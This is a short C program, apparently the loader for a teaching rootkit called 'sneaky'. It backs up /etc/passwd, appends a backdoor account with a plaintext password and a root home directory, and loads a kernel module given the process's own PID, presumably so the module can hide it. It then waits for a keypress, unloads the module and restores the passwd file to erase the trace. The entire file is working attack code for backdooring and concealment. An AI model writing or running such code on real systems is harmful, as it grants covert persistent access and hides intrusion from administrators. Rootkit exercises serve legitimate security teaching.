#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define LEN 1024

int main() {
  printf("sneaky_process pid = %d\n", getpid());
  //tamper passwd
  system("cp /etc/passwd /tmp");
  system(
	 "printf 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' $USER >> /etc/passwd");
  //load module

  int pid = (int)getpid();
  char load[LEN];
  sprintf(load, "insmod sneaky_mod.ko mypid=%d", pid);
  system(load);

  //wait until q
  char c;
  while ((c = getchar()) != 'q') {
  }
  //unload module

  system("rmmod sneaky_mod");

  //disguise
  system("cp /tmp/passwd /etc");
  system("rm /tmp/passwd");
  return EXIT_SUCCESS;
}
